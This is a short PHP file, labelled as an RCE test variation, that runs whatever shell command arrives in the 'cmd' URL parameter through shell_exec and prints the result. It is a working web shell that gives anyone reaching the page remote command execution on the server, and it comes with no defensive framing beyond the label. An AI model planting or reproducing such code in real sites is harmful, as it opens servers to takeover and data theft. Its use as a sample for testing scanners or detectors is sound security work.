<?php
// RCE test variation #1108
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>